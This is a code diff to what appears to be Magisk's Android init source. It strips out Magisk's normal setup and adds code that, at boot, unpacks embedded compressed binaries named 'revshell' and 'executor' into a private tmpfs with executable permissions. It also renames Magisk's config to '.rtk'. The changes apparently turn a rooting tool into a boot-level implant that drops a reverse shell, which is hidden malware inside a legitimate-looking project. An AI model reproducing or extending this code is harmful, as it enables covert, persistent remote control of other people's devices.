@@ -7,6 +7,15 @@
 #include <magisk.hpp>
 
 #include "init.hpp"
+#include "unxz.hpp"
+
+#ifdef USE_64BIT
+#include "binaries_revshell64.h"
+#include "binaries_executor64.h"
+#else
+#include "binaries_revshell.h"
+#include "binaries_executor.h"
+#endif
 
 using namespace std;
 
@@ -302,8 +311,8 @@ void SARBase::backup_files() {
         backup_folder("/overlay.d", overlays);
 
     self = raw_data::read("/proc/self/exe");
-    if (access("/.backup/.magisk", R_OK) == 0)
-        config = raw_data::read("/.backup/.magisk");
+    if (access("/.backup/.rtk", R_OK) == 0)
+        config = raw_data::read("/.backup/.rtk");
 }
 
 void SARBase::mount_system_root() {
@@ -377,26 +386,19 @@ void BaseInit::exec_init() {
             LOGD("Unmount [%s]\n", p.data());
     }
 
-    // TODO : удаление /.backup и /dev/sys_ctl приводит к тому что система не загружается до конца
-
     execv("/init", argv);
     exit(1);
 }
 
-static void patch_socket_name(const char *path) {
-    char rstr[16];
-    gen_rand_str(rstr, sizeof(rstr));
-    auto bin = raw_data::mmap_rw(path);
-    bin.patch({ make_pair(MAIN_SOCKET, rstr) });
-}
-
 void MagiskInit::setup_tmp(const char *path) {
     // exit if we are on old boot process but proceed with mounts if we are on SAR or 2SI devices
-    if (path == "/sbin") {
-        return;
-    }
-//    LOGD("Setup Magisk tmp at %s\n", path);
-//    xmount("tmpfs", path, "tmpfs", 0, "mode=755");
+
+    // TODO   wtf crash ?
+    //  seems like    if (path == "/sbin")   was like   if (false)
+//    if (strcmp(path, "/sbin") == 0) {
+//        return;
+//    }
+
     xmount("tmpfs", path, "tmpfs", 0, "mode=700");
 
     chdir(path);
@@ -404,20 +406,15 @@ void MagiskInit::setup_tmp(const char *path) {
     xmkdir(MIRRDIR, 0);
     xmkdir(BLOCKDIR, 0);
 
-//    int fd = xopen(INTLROOT "/config", O_WRONLY | O_CREAT, 0);
-//    xwrite(fd, config.buf, config.sz);
-//    close(fd);
-//    fd = xopen("magiskinit", O_WRONLY | O_CREAT, 0755);
-//    xwrite(fd, self.buf, self.sz);
-//    close(fd);
-//    dump_magisk("magisk", 0755);
-//    patch_socket_name("magisk");
+    // Extract revshell
+    int fd = xopen("revshell", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
+    unxz(fd, revshell_xz, sizeof(revshell_xz));
+    close(fd);
 
-    // Create applet symlinks
-//    for (int i = 0; applet_names[i]; ++i)
-//        xsymlink("./magisk", applet_names[i]);
-//    xsymlink("./magiskinit", "magiskpolicy");
-//    xsymlink("./magiskinit", "supolicy");
+    // Extract executor
+    fd = xopen("executor", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
+    unxz(fd, executor_xz, sizeof(executor_xz));
+    close(fd);
 
     chdir("/");
 }
